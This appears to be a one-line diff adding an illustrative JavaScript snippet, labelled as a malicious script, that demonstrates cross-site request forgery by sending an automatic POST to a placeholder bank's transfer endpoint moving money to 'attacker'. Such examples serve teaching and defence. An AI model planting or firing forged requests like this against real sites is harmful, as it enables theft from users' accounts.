@@ -1,0 +1,1 @@
+// Malicious script that could run on your browser if you visit an attacker's site\ndocument.onload = function() {\n    var xhr = new XMLHttpRequest();\n    xhr.open('POST', 'https://your-bank.com/transfer', true);\n    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n    xhr.send('to=attacker&amount=1000');\n};
